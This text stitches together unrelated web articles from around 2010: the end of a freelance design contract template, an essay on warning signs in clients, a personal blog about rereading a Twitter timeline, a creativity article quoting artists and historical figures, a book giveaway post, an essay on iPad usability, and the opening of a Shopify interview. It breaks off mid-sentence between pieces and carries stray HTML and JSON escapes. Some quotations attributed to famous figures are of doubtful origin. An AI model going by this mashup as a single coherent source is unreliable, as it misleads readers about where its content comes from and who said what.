payment.</p><p><strong>2. Default in payment</strong><br> The Client shall assume responsibility for cost outlays by designer in all collections of unpaid fees and of legal fees necessitated by default in payment. Invoices in default will include but are not limited to fees for collection and legal costs.</p><p><strong>3. Estimates</strong><br> The fees and expenses shown are minimum estimates only unless an hourly fee has been agreed upon. That fee will be ________ per hour and the designer shall keep the client apprised of a tally of hours within a reasonable period of time. Final fees and expenses shall be shown when invoice is rendered. The fees and expenses shown are minimum estimates only unless the quote and/or invoice is clearly marked Firm Quote, otherwise the below stated hourly fee will be payable on all time over that which was quoted with a minimum in 30 minute increments.</p><p><strong>4. Changes</strong><br> The Client must assume that all additions, alterations, changes in content, layout or process changes requested by the customer will alter the time and cost. The Client shall offer the Designer the first opportunity to make any changes.</p><p><strong>5. Expenses</strong><br> The Client shall reimburse the Designer for all expenses arising from this assignment, including the payment of any sales taxes due on this assignment, and shall advance the Designer for payment of said expenses, including but not limited to Stock Photography, Artwork and/or material needed for the project.</p><p><strong>6. Cancellation</strong><br> In the event of cancellation of this assignment, ownership of all copyrights and the original artwork shall be retained by the Designer, and a cancellation fee for work completed, and expenses already incurred, shall be paid by the Client. Cancellation fee is based on the hours submitted, if the project is on an hourly basis or a percentage based on the time estimate for the entire job. A 100% cancellation fee is due once the project has been finished, whether delivered to the client or not. If the project is on an hourly basis and the project is canceled by the client, the client agrees to pay no less than 100% of the hours already billed for the project at the time of cancellation plus a flat fee of $250 or 50% of the remaining hours that were expected to be completed on the project, whichever is greater.</p><p><strong>7. Ownership and return of artwork</strong><br> The Designer retains ownership of all original artwork, whether preliminary or final, and the Client shall return such artwork within 30 days of use unless indicated otherwise below. If transfer of ownership of all rights is desired, the rates may be increased. If the Client wishes the ownership of the rights to a specific design or concept, these may be purchased at any time for a recalculation of the hourly rate on the time billed or the entire project cost.</p><p><strong>8. Credit Lines</strong><br> The Designer and any other creators shall receive a credit line with any editorial usage. If similar credit lines are to be given with other types of usage, it must be so indicated here.</p><p><strong>9. Releases</strong><br> The Client shall indemnify the Designer against all claims and expenses, including attorney’s fees, due to the uses for which no release was requested in writing or for uses that exceed authority granted by a release.</p><p><strong>10. Modifications</strong><br> Modifications of the terms of this contract must be written and authorized by both parties, involving the implementation of a new version of the contract as a whole following standard procedures of documentation and approval.</p><p><strong>11. Uniform commercial code</strong><br> The above terms incorporate Article 2 of the Uniform Commercial Code.</p><p><strong>12. Code of fair practice</strong><br> The Client and the Designer agree to comply with the provisions of the Code of Fair Practice (which is in the Ethical Standards section of chapter 1, Professional Relationships).</p><p><strong>13. Code of fair practice</strong><br> The Designer warrants and represents that, to the best of his/her knowledge, the work assigned hereunder is original and has not been previously published, or that consent to use has been obtained on an unlimited basis; that all work or portions thereof obtained through the undersigned form third parties is original or, if previously published, that consent to use has been obtained on an unlimited basis; that the Designer has full authority to make this agreement; and that the work prepared by the Designer does not contain any scandalous, libelous, or unlawful matter. This warranty does not extend to any uses that the Client or others may make of the Designer’s product that may infringe on the rights of others. Client expressly agrees that it will hold the Designer harmless for all liability caused by the Client’s use of the Designer’s product to the extent such use infringes on the rights of others.</p><p><strong>14. Limitation of liability</strong><br> Client agrees that it shall not hold the Designer or his/her agents or employees liable for any incidental or consequential damages that arise from the Designer’s failure to perform any aspect of the project in a timely manner, regardless of whether such failure was caused by intentional or negligent acts or omissions of the Designer or Client, any client representatives or employees, or a third party.</p><p><strong>15. Dispute Resolution</strong><br> Any disputes in excess of the maximum limit for small-claims court arising out of this Agreement shall be submitted to binding arbitration before a mutually agreed-upon arbitrator pursuant to the rules of the American Arbitration Association. The Arbitrator’s award shall be final, and judgment may be entered in any court having jurisdiction thereof. The client shall pay all arbitration and court cost, reasonable attorney’s fees, and legal interest on any award of judgment in favor of the Designer. All actions, whether brought by client or by designer will be filed in the designer’s state/county of business/residence.</p><p><strong>16. Acceptance of terms</strong><br> The signature of both parties shall evidence acceptance of these terms.</p><p>Designer: __________________</p><p>Date: _____________________</p><p>Client: _____________________</p><p>Date: ______________________</p><p><strong>16a. Acceptance of terms</strong><br> The action of the sending and receipt of this agreement via electronic method will hold both parties in acceptance of these terms. The Designer as sender and the client as recipient will acknowledge acceptance of these terms either through an e-mail noting acceptance or acceptance is acknowledged at the beginning of any work on said project.

Drafting a creative brief and adjusting a contract take a good amount of time and effort. What is most often ignored is the process long before the contract/argument/threats stage. There are red flags and tell-tale signs to look out for when discussing a job with the client. (Just as when you are being interviewed for a full-time position, <em>you</em> are also interviewing <em>them</em>.) How do they communicate? Do they constantly interrupt you and boast? That kind of personality will tend to micro-manage and belittle you, after which they will try to cut your bill in half because they “did all the creative work.”</p><p>Red flags are those little bells that go off in your head, or the saliva you produce as you get ready to vomit. One red flag I like is pulling up to a prospective client’s business address and finding that the building doubles as a crack house. Not getting out of the car at all saves me a great deal of time and effort.</p><p>If you make it to the reception area, look around. Any awards, plaques or licenses? The tell-tale sign of a summons from the courts pasted across the door? Are the people who walk in and out smiling or bleeding? Unhappy employees mean you will not enjoy working for the client either. If you see a pile of mail on the reception desk, are there envelopes marked “<strong>Final notice</strong>”? Is everyone well mannered and respectful? Were you kept waiting more than 15 minutes after your appointment time? Is the office neat and clean? If it’s disorganized and filthy, that’s how they will treat you.</p><p>The quiet shy client will ask 200 or more people (and animals) for their input on the design and then request all of those things from you. Charge hourly and you’ll be able to retire on the change this client rolls up… if you get paid, that is.</p><p>The overexcited type wants to be your friend and hang out at a bar during meetings. Because they are also a raging alcoholic, they won’t remember what they approved or what they asked you or what you told them. If you have a contract, they won’t remember it and will argue that it doesn’t count.</p><p>The person who flips through your portfolio like a Las Vegas card dealer is looking to hire a pair of hands to execute their ideas. Go hourly, and make sure to keep the client informed of the hours as you go along, so that they understand why they have a $20,000 letterhead after you’ve had seven sleepless weeks of work.</p><p>The corporate art director will be easy-going and have a contract all ready for you. After you’ve signed away all rights and future children, and you’ve delivered the job, they will be as helpless as you to see through a timely payment, so why bother mentioning it? The invoice is passing through layers, and when it reaches the accounting department, you must bear the corporate-mandated pecking order of payment. Freelancer rates just below cockroach exterminator on the list of payees.</p><p>I’ve gone through all of these episodes. We all have. So, what do you do? The saving grace is the comfort I get when a client smiles, tells me they love my work and want me to do “something different,” when they do everything on the level and pays me a fair rate in a reasonable time. It happens enough to keep me from quitting the business some days, but the other personality types sure do test my patience the other days.</p><p>[By the way, did you know we have a brand new free <a href=\"http://www.smashingmagazine.com/the-smashing-newsletter/\">Smashing Email Newsletter</a>?

I browsed through my entire timeline on Twitter, going backwards until I found my first tweet on the 20th of October 2007.</span></p>\n<p>Then I started to retrace my steps tweet by tweet for the last three years of my life. It really felt like going “back to the future” through a load of often insignificant but funny events of my own recent life stream.</p>\n<p>Two months after my first tweet, the number of my Followed was more or less equal to the number of current Ashton Kutcherʼs Followers. Back then I hadnʼt started to write this blog yet and I only had around twenty strangers following me upon trust. Shortly after Twitter became a kind of drug for me. I began to talk about every single thing I did. </p>\n<p>The day before Christmas Eve of that year I wrote: “I’m in Rome, Via del Corso. I am doing some shopping with my beautiful girl”. Of course I never would have thought that she would leave me over the phone just a week later.</p>\n<p>Later, in April 2008, in a club in Rome I met a girl named Katherine. She was so hot. After ten minutes of talking she asked me to take a picture together. Shot it to her satisfaction and posted it on Twitter. Katherine and I got more intimate that night, she told me she lived in Los Angeles, that she was a model, and that she occasionally appeared in some unspecified movie production. Looking at her, I must confess, for a second I pictured her in Vivid Video Studios while filming a lesbian scene with Jenna Jameson.</p>\n<p>That evening, I posted more than a dozen tweets about the evolution of our relationship, until at some point, when she stuck her tongue in my mouth, I found something more interesting to do than sending 140 character messages to Twitter.</p>\n<p>On September 4, 2009 I played down a sudden nuisance: “I have a severe pain in my left ear. I think it might be otitis.”</p>\n<p>Two days later I was in the hospital with half my face paralyzed, my mouth closed tight and one eye I wasnʼt able to close, wide open. I was diagnosed Bell’s palsy. Forty days later, after a cure based on cortisone injections that would have probably smashed a mammoth, a medical report certified that I was finally healed. In the meantime I kept posting a long bulletin made of regular tweets worthy of a medical encyclopedia.</p>\n<p>My next tweet will be about this post. It will be something like “New post up on Woork Up &gt; Back to the Future With Your Twitter Timeline” What happens next, I’ll tell you next time. Meanwhile it would be nice to know if you had any particular experience you kept track of on Twitter. Did you ever look back on those days?</p>\n<p>To be continued…</p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/Woork?a=Itex8c01vnU:Dq3Z09NBK90:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/Woork?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Itex8c01vnU:Dq3Z09NBK90:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/Woork?i=Itex8c01vnU:Dq3Z09NBK90:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Itex8c01vnU:Dq3Z09NBK90:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/Woork?i=Itex8c01vnU:Dq3Z09NBK90:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Itex8c01vnU:Dq3Z09NBK90:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/Woork?i=Itex8c01vnU:Dq3Z09NBK90:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Itex8c01vnU:Dq3Z09NBK90:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/Woork?d=qj6IDK7rITs\" border=\"0\"></a>\n</div>"

I picked a handful of creatives, almost at random — there are so many that picking the best would be impossible, so I just picked some that I admire, who came to mind when I thought of the word “creative”.</p>\n<p>This was going to be a list of their creative habits … but in reviewing their lists, and my own habits, I found one that stood out. And it stands out if you review the habits and quotes from great creative people in history.</p>\n<p>It’s the Most Important Habit when it comes to creativity.</p>\n<p>After you read the No. 1 habit, please scroll down and read the No. 2 habit — they might seem contradictory but in my experience, you can’t really hit your creative stride until you find a way to balance both habits.<span></span></p>\n<h3>The No. 1 Creativity Habit</h3>\n<p>In a word: solitude.</p>\n<p>Creativity flourishes in solitude. With quiet, you can hear your thoughts, you can reach deep within yourself, you can focus.</p>\n<p>Of course, there are lots of ways to find this solitude. Let’s listen to a few of the creative people I talked to or researched:</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/feliciaday.jpg\" alt=\"\" align=\"left\"><strong><a href=\"http://feliciaday.com/blog\">Felicia Day</a></strong> – wonderful actress perhaps best known for her awesome awesome work on <a href=\"http://www.drhorrible.com/\">Dr. Horrible’s Sing-along Blog</a>, Buffy the Vampire Slayer, and <a href=\"http://www.watchtheguild.com/\">The Guild</a>.</p>\n<p>I was thrilled when she replied to my email asking about her creative habits. One of the things she said: she makes “sure to be creative first thing in the morning, before doing anything for the outside world, really sets the day up for me. It makes it feel that CREATING is my job, not answering emails.”</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/aliedwards.jpg\" alt=\"\" align=\"left\"><strong><a href=\"http://www.aliedwards.com/\">Ali Edwards</a></strong> – an author, designer, and leading authority on scrapbooking.</p>\n<p>I was honored with a response from Ali as well. One of her top habits wasn’t exactly solitude, but is related: “<strong>Do nothing</strong>. I have a habit of welcoming time away from my creative work. For me this is serious life-recharging time where my only responsibility is to just be Mom &amp; Wife &amp; Me. Doing nothing has a way of synthesizing what is really important in my life and in my work and inspires me beyond measure. When I come back to work I am better equipped to weed out the non-essential stuff and focus on the things I most want to express creatively.”</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/chasejarvis.jpg\" alt=\"\" align=\"left\"><strong><a href=\"http://blog.chasejarvis.com/blog/\">Chase Jarvis</a></strong> – an award-winning photographer.</p>\n<p>Chase also kindly responded with several of his key creativity habits — see more great ones at the bottom of this post. But here’s one that I loved: “Find Quiet.  Creativity sometimes washes over me during times of intense focus and craziness of work, but more often I get whacked by the creative stick when I’ve got time in my schedule.  And since my schedule is a crazy one and almost always fills up if I’m just “living”, I tend to carve out little retreats for myself.  I get some good thinking and re-charge time during vacations, or on airplanes, but the retreats are more focused on thinking about creative problems that I’m wanting to solve.  That’s why I intentionally carve time out.  I make room for creativity.  Intentionally.  The best example of what I mean by a retreat is a weekend at my family’s cabin.  It’s a 90 minute drive from my house on the coast.  There are few distractions.  Just a rocky beach and a cabin from the 60’s with wood paneling and shag carpet.  I go for walks, hikes, naps. I read.  I did get an internet signal put in there to stay connected if I need it.  But the gist is QUIET.  Let there be space for creativity to fill your brain.”</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/maciej.jpg\" alt=\"\" align=\"left\"><strong><a href=\"http://www.idlewords.com/\">Maciej Cegłowski</a></strong> – painter, programmer, excellent writer.</p>\n<p>Maciej is one of my favorite bloggers, and responded to my email with a classically short answer that to me, embodies a beautiful way to find solitude.</p>\n<p>What habit helps his creativity?</p>\n<p>Maciej replied: “Running up hills!”</p>\n<p><strong>Leo Babauta</strong>: OK, I wasn’t going to talk about myself in this post, but I thought I should share some of my previous thoughts.</p>\n<p>The best art is created in solitude, for good reason: it’s only when we are alone that we can reach into ourselves and find truth, beauty, soul. Some of the most famous philosophers took daily walks, and it was on these walks that they found their deepest thoughts.</p>\n<p>My best writing, and in fact the best of anything I’ve done, was created in solitude.</p>\n<p>Just a few of the benefits I’ve found from solitude:</p>\n<ul>\n<li>time for thought</li>\n<li>in being alone, we get to know ourselves</li>\n<li>we face our demons, and deal with them</li>\n<li>space to create</li>\n<li>space to unwind, and find peace</li>\n<li>time to reflect on what we’ve done, and learn from it</li>\n<li>isolation from the influences of other helps us to find our own voice</li>\n<li>quiet helps us to appreciate the smaller things that get lost in the roar</li>\n</ul>\n<p><strong>Read more</strong>: <a href=\"http://zenhabits.net/solitude/\">the lost art of solitude</a>.</p>\n<h3>The Greats on Solitude</h3>\n<p>Of course, many other creative people have believed in the habit of solitude. I’ve collected a small but influential sample here. There are many more examples.</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/mozart.jpg\" alt=\"\" align=\"left\"><a href=\"http://en.wikipedia.org/wiki/Wolfgang_Amadeus_Mozart\">Wolfgang Amadeus Mozart</a> – prolific and influential composer of the Classical era. He composed over 600 works, many acknowledged as pinnacles of symphonic, concertante, chamber, piano, operatic, and choral music. He is among the most enduringly popular of classical composers.</p>\n<p>Mozart: “When I am, as it were, completely myself, entirely alone, and of good cheer–say, traveling in a carriage or walking after a good meal or during the night when I cannot sleep–it is on such occasions that my ideas flow best and most abundantly.”</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/einstein.jpg\" alt=\"\" align=\"left\"><a href=\"http://en.wikipedia.org/wiki/Albert_Einstein\">Albert Einstein</a> –  theoretical physicist, philosopher and author who is widely regarded as one of the most influential and best known scientists and intellectuals of all time. He is often regarded as the father of modern physics.</p>\n<p>Einstein: “On the other hand, although I have a regular work schedule, I take time to go for long walks on the beach so that I can listen to what is going on inside my head. If my work isn’t going well, I lie down in the middle of a workday and gaze at the ceiling while I listen and visualize what goes on in my imagination.”</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/kafka.jpg\" alt=\"\" align=\"left\"><a href=\"http://en.wikipedia.org/wiki/Franz_Kafka\">Franz Kafka</a> – one of the most influential writers of the 20th century. Novelist and writer of short stories whose works came to be regarded as one of the major achievements of 20th century literature.</p>\n<p>Kafka: “You need not leave your room. Remain sitting at your table and listen. You need not even listen, simply wait, just learn to become quiet, and still, and solitary. The world will freely offer itself to you to be unmasked. It has no choice; it will roll in ecstasy at your feet.”</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/tesla.jpg\" alt=\"\" align=\"left\"><a href=\"http://en.wikipedia.org/wiki/Nikola_Tesla\">Nikola Tesla</a> – inventor, one of the most important contributors to the birth of commercial electricity, best known for his many revolutionary developments in the field of electromagnetism.</p>\n<p>Tesla: “The mind is sharper and keener in seclusion and uninterrupted solitude. Originality thrives in seclusion free of outside influences beating upon us to cripple the creative mind. Be alone—that is the secret of invention: be alone, that is when ideas are born.”</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/haydn.jpg\" alt=\"\" align=\"left\"><a href=\"http://en.wikipedia.org/wiki/Joseph_Haydn\">Joseph Haydn</a>: A life-long resident of Austria, Haydn spent much of his career as a court musician for the wealthy Hungarian aristocratic Esterházy family on their remote estate. Isolated from other composers and trends in music until the later part of his long life, he was, as he put it, “forced to become original”</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/goethe.jpg\" alt=\"\" align=\"left\"><a href=\"http://en.wikipedia.org/wiki/Johann_Wolfgang_von_Goethe\">Johann Wolfgang von Goethe</a> – German writer and polymath. Goethe’s works span the fields of poetry, drama, literature, theology, philosophy, and science.</p>\n<p>His magnum opus, lauded as one of the peaks of world literature, is the two-part drama Faust.</p>\n<p>Goethe: “One can be instructed in society, one is inspired only in solitude.”</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/picasso.jpg\" alt=\"\" align=\"left\"><a href=\"http://en.wikipedia.org/wiki/Pablo_Picasso\">Pablo Picasso</a> – Spanish painter best known for co-founding the Cubist movement and for the wide variety of styles embodied in his work. His revolutionary artistic accomplishments brought him universal renown and immense fortunes throughout his life, making him one of the best-known figures in twentieth century art.</p>\n<p>Picasso: “Without great solitude no serious work is possible.”</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/sandburg.jpg\" alt=\"\" align=\"left\"><a href=\"http://en.wikipedia.org/wiki/Carl_Sandburg\">Carl Sandburg</a> –  American writer and editor, best known for his poetry.</p>\n<p>He won three Pulitzer Prizes, two for his poetry and another for a biography of Abraham Lincoln. H. L. Mencken called Carl Sandburg “indubitably an American in every pulse-beat.”</p>\n<p>Sandburg: “One of the greatest necessities in America is to discover creative solitude.”</p>\n<p><img style=\"padding:5px\" src=\"http://zenhabits.net/fotos/mann.jpg\" alt=\"\" align=\"left\"><a href=\"http://en.wikipedia.org/wiki/Thomas_Mann\">Thomas Mann</a> – German novelist, short story writer, social critic, philanthropist, essayist, and 1929 Nobel Prize laureate, known for his series of highly symbolic and ironic epic novels and novellas, noted for their insight into the psychology of the artist and the intellectual.</p>\n<p>Mann: “Solitude gives birth to the original in us, to beauty unfamiliar and perilous — to poetry.”</p>\n<h3>The No. 2 Creative Habit</h3>\n<p>While it might seem contradictory, the No. 2 habit when it comes to nurturing creativity: participation. This can come in many forms, but it requires connecting with others, being inspired by others, reading others, collaborating with others.</p>\n<p>But how can you have both solitude and participation? They obviously have to come at different times. Finding the balance is key, of course, but it takes a conscious effort: this time is for solitude, and this time is for participation.</p>\n<p>Why are they both important? We need inspiration from without, but we need creation from within.</p>\n<p>A couple of the people I interviewed had habits that relate to this:</p>\n<p><strong><a href=\"http://blog.chasejarvis.com/blog/\">Chase Jarvis</a></strong>: “<strong>Devour Popular Culture</strong>. Consuming the works of others inspires me.  And it’s not just museums and the “establishment”. I devour magazines, books, street art, performances, music, etc. All things that make me think critically (and whimsically) about the world. You get the picture. Inspiration can come from anywhere.”</p>\n<p><strong><a href=\"http://awww.aliedwards.com/\">Ali Edwards</a></strong>: “<strong>Participate</strong>. My creative spirit is interested in documenting the wonderful everyday details of our lives. To really get to the heart of the matter I need to be fully participating in my life, in the interactions with my kids and husband and family and friends. If I am just going through the motions or wishing away the present moment for “the next thing” I am missing the blessing of right now. My creativity requires the habit of active participation and daily attention to detail.”</p>\n<h3>Other Creative Habits</h3>\n<p>There are other habits than those top two, of course, that can nourish creativity. Some other good ones:</p>\n<p><strong><a href=\"http://feliciaday.com/blog\">Felicia Day</a></strong>: “When I am most productive I am the most ruthless with my schedule. I will literally make a daily checklist with, “one hour gym”, “30 minutes of internet research,” and “drink 3 glasses of water” on it. For some reason being that disciplined creates a sense of control that I wouldn’t have otherwise, as a self-employed person, and I get the most out of the scheduled hours that I have for writing.”</p>\n<p><strong><a href=\"http://www.aliedwards.com/\">Ali Edwards</a></strong>: “Take notes. I am a really good note-taker. It’s essential for me to write down my ideas when they come to mind…otherwise, poof, they disappear way too quickly as I move on to the next task (diaper changes, wiping noses, tending to the stuff of life). I use my phone, my computer, and a moleskine notebook to jot down thoughts and ideas and then I move them into Things every week or so.”</p>\n<p><strong><a href=\"http://blog.chasejarvis.com/blog/\">Chase Jarvis</a></strong> had a few more:</p>\n<ul>\n<li><strong>Live a creative life everyday</strong>.  I very much believe in doing creative stuff everyday. For one, I take photos and videos almost everyday.  Doesn’t matter the camera.  I use my iPhone everyday. Just taking photos keeps me in a creative headspace.  Hell, I play with my food and draw and doodle.</li>\n<li><strong>Moderate Expectations</strong>. Make it a habit not to judge yourself on your creative output.  Sometimes your creativity is on fire.  Great news.  Other times, it’s not.  It’s hard sometimes when you make art in a professional commercial capacity because you’re paid to be ‘ON’, but you’ll save yourself a lot of greif if you make it a habit to be cool to your psyche when your creative mojo isn’t firing on all pistons.</li>\n<li><strong>Shake Your Tree</strong>.  When I’m starting to feel stale, I make a habit of getting into adventures.  Break molds. Drive home from work a different way. Stir up my routine.  I get active and <a href=\"http://blog.chasejarvis.com/blog/2009/05/shake-your-tree-today.html\">shake my tree</a>.</li>\n<li><strong>Find fun</strong>.  Doing what you love inspires you to be more creative.  Make time and space for having fun.  All work and no play makes Jane a dull girl.</li>\n<li>Lastly, being creative means <strong>living a creative life</strong>.  Expect yourself to have one.  Believe you are creative. Know that you are. Make that the most important habit of all.</li>\n</ul>\n<p>For more on creativity, read my <a href=\"http://zenhabits.net/the-little-but-really-useful-guide-to-creativity/\">Little But Useful Guide to Creativity</a>.</p>\n<blockquote><p>“Creativity is essentially a lonely art. An even lonelier struggle. To some a blessing. To others a curse. It is in reality the ability to reach inside yourself and drag forth from your very soul an idea.” <strong>~Lou Dorfsman </strong></p></blockquote>\n<p>—<br>\n<strong>If you liked this guide, please <a href=\"http://del.icio.us/post?url=http://zenhabits.net/creative-habit/&amp;title=The%20No.%201%20Habit%20of%20Highly%20Creative%20People\">bookmark it on Delicious</a> or <a href=\"http://twitter.com/home?status=Reading:%20The%20No.%201%20Habit%20of%20Highly%20Creative%20People%20http://bit.ly/c5xMut%20via%20@zen_habits\">share on Twitter</a>.

If you didn’t see our interview with Radim, you can check it out <a rel=\"nofollow\" href=\"http://www.webdesignerdepot.com/2009/02/meet-radim-malinic-the-graphic-artist-behind-webdesigner-depot/\">here</a></p>\n<p>It’s filled with designs from the past 18 months, both in detail and in real-world settings.</p>\n<p>The list of clients included in this book is extensive, and includes high profile organizations such as the London Film Museum, QV Melbourne, Acer Computers and Haagen-Dazs ice cream.</p>\n<p><strong>Read on to know more about </strong><a rel=\"nofollow\" href=\"http://brandnu.co.uk/home/three.php\"><strong>#Three</strong></a><strong> and for a chance to win 1 of 5 books that we will be giving away next week…</strong><span></span></p>\n<p>In addition to a number of client projects and editorial designs, the book also includes some experimental designs that are previously unpublished.</p>\n<p>Each project has a brief description, covering the basis of the project. It’s an inspirational masterpiece, as well as a great example of a portfolio design appropriate for a high-caliber designer. It shows a level of commitment and professionalism that many designers don’t bother with.</p>\n<blockquote><p><em>Three is one of my lucky numbers and as the initial project name, ended up being the final title. </em></p>\n<p><em>The Book of Colours was an obvious name for pages filled with vibrant images but I like the ambiguity of THREE, which could be anything, in any colour or shape. The title vector image is based on Buttermilk font, which I have modified slightly. The whole image is a subtle number three.</em></p>\n</blockquote>\n<p><br></p>\n<p>Available on the Brand Nu website is an article about the <a href=\"http://brandnu.co.uk/home/making_of_three.php\">making of Book #THREE</a>, which gives an interesting, behind-the-scenes look at what goes into the production of this kind of book.</p>\n<p>And here’s a cool video made for the book:</p>\n<p>\n<iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://vimeo.com/moogaloop.swf?clip_id%3D12112472%26server%3Dvimeo.com%26show_title%3D1%26show_byline%3D1%26show_portrait%3D0%26color%3D%26fullscreen%3D1&amp;width=615&amp;height=347\" width=\"615\" height=\"347\"></iframe>\n</p>\n<p><a href=\"http://vimeo.com/12112472\"></a></p>\n<blockquote><p><em>The idea for Book #THREE came in October 2009 when I had a look over some recent work. As with any bigger multipage project I printed out three copies of a flat plan on A4 pages and started to scribble down a few ideas for page layouts. </em></p>\n<p><em>At that point I realised I wanted to create and feature work to showcase the new techniques in my work.</em></p>\n<p><em>A flat plan will give you an exact idea about content placement and enables you to juggle this with ease. The third flat plan draft was the final version, though detail did change as I started to put the book together in Adobe InDesign.</em></p>\n</blockquote>\n<p><br></p>\n<p>It’s definitely worth a look if you’re considering a similar project.</p>\n<p>For a chance to <strong>win one of 5 copies</strong> of Radim’s new book, simply leave a comment at the end of this post. We’ll run this contest for one week and announce the results on <strong>Friday June 11th, 2010</strong>.

The common meme is relating the computing usage trends to that of the car industry. As I watch continue to watch my family use their devices, it does feel like things are changing. My mum continues to thrive on her iPad / Palm Pixi combo. She feels empowered to try the different corners of the experience. To download new experiences. She is having fun.</p>\n<p><img src=\"http://almaer.com/blog/uploads/stickshift.jpg\" alt=\"stickshift\" title=\"stickshift\" width=\"480\"></p>\n<p>One friend suggested that it is like the shift (pun intended) that we saw when automatic transmissions were introduced. At first they were expensive and had some issues, but being able to have simple controls changed the way that people drove. It became so simple. There were people who cried that it would never take off. \"People want the control of a manual stick shift system!\" However, although we continue to see some die-hards, the vaste majority of the US population drive automatics (this isn't true everywhere in the world). That battle is over. We will never go back.</p>\n<p>The iPad experience is like driving the computing experience without the manual hassle. You don't have to know how to install the engine to start out (install an OS), nor deal with (and worry endlessly about) the workings. In general, you just don't need to worry about all of the abstractions any more. The notion of files. And, don't get me started on viruses.</p>\n<p>As my mother thrives on her iPad, I use it sparingly, mainly as an entertainment consumption device. Wait a minute: <em>Am I am the guy who loves the stick shift and never wants to jump to an automatic?</em> I am a little different from the religious chaps who claimed they couldn't understand why anyone would want an automatic. Or looked down on those people. I understand why my Mum prefers the iPad experience.</p>\n<p>I do find the iPad experience often frustrating however. My \"why did the car shift then? it wasn't time!\" moments occur mainly around the restricted access to customization, and the inherent and enforced immersion.</p>\n<p>First a small thing, which will unfortunately show off an how anal I can be:</p>\n<p><img src=\"http://almaer.com/blog/uploads/bbcname1.png\" alt=\"bbcname\" title=\"bbcname\" width=\"99\" height=\"107\"></p>\n<p>I want to rename this to \"BBC News\". I am the guy who winces when someone bookmarks a page and doesn't rename it, thus having \"Foo.com - a barish company that deals in widgets, gadgets, monkeys, and flubbers\". I want to jump in and rename it to \"Foo\" on the bookmark bar. More space. More room. Petty for sure.</p>\n<p>Where it gets more real for me is in the lack of integration between applications. Being immersed with one application at a time can be a fantastic thing, I will give you that... even if I often would love to give a bit of screen real estate to me Twitter stream while working on another app right next to it. However, if you live in an immersive environment, you need great integration between experiences. I should be able to Tweet/Share from any application, and not have to close down the app, go to a Twitter client, and get back to the app that had content I was tweeting. A lot of this comes down to multitasking, but more comes from integration..... and putting intents on a stack. On the iPad I feel like I am jumping through doors without an easy way to go back.</p>\n<p>The browser has some of these notions baked in. States have URLs that I can bookmark. I can go forward and back. I can search. I can fork off (new tab). Turns out, I really like those abstractions, and miss them when they are not there, and every single app tries to reproduce some of them. They are often cross cutting concerns. I don't want the app developer to have to write code and choose where to put a \"Share\" button. I want the system to know that I have an account on Twitter and let me share with a simple gesture.</p>\n<p>Back to the Web. I was a little stunned when a friend showed me the <a href=\"http://speedtest.net/\">Speed Test.net</a> experience on an iPad:</p>\n<p><img src=\"http://almaer.com/blog/uploads/speedtest.png\" alt=\"speedtest\" title=\"speedtest\" width=\"480\" height=\"640\"></p>\n<p>Yup, if you go to speedtest.net, you are automatically redirected to the App Store. There is no way to trick it (again: would be nice to have customizability and tweak user agents etc).</p>\n<p>To the credit of the speed test developers, the website is driven by Flash, which won't work.... so they are trying to do something good for a user. I get that.</p>\n<p>However, I am scared to death to think of the Web going this way. You go to websites and get sent to apps directly. I *do* want user agents to tell me if apps are available (hence the <a href=\"http://almaer.com/blog/appdiscover\">App Discover</a> experiment), but don't force me into the world of apps. I also think that doing what YouTube does and take over a URL in a certain way can be a good thing. I would love to install handlers for mime types.... so a certain link always opens up my favourite Twitter client say.</p>\n<p>I personally prefer many of the Web experiences to the \"new\" app experiences. (I talked earlier about the abstractions that I find useful). This could break the Web. Data that was shared at the ReadWriteWeb Mobile Summit showed that the same users often hit a site using: mobile website, full website, and application. We are context switching in real-time already.

      "content" : "<p><em>“Profitable and proud” is a Signal vs. Noise series that profiles companies that have $1MM+ in revenues, didn’t take VC, and are profitable. Below: Q&amp;A with Tobias Lütke of <a href=\"http://www.shopify.com/\">Shopify</a>.</em></p>\n\n\n\t<p><strong>What does Shopify do?</strong></p>\n\n\n\t<p>The short version is that Shopify allows people with great products to create awesome online stores that do those products justice.</p>\n\n\n\t<p>The long version is that Shopify is our idea of how an online store should be run. We originally started the company not to create an online store system, but rather to sell snowboards. Back in the day, we hoped we would find software that would allow us to run our store on the Internet; we never found anything close to what we wanted, so we built it ourselves.</p>\n\n\n\t<p><strong>How successful is your business?</strong></p>\n\n\n\t<p>Certainly, we’ve always been pretty transparent with our numbers. We have about 6000 active merchants ( selling products this week ) from over 60 different countries. Collectively, they have sold over $100m in products in the last year.</p>\n\n\n\t<p>In terms of our own business; I can’t really share our actual revenues but it’s in the multiple millions. We recently won some recognition as <a href=\"http://bit.ly/dAmQRK\">Ottawa’s fastest growing company</a>. We have been profitable since 2008.</p>\n\n\n\t<p><img src=\"http://s3.amazonaws.com/37assets/svn/shopify_index.001.png\" width=\"530\" height=\"334\" alt=\"shopify guys\"><br>\n<em>Cody Fauser, Tobi Lütke, Daniel Weinand.</em></p>\n\n\n\t<p><strong>You originally started a snowboard business called <a 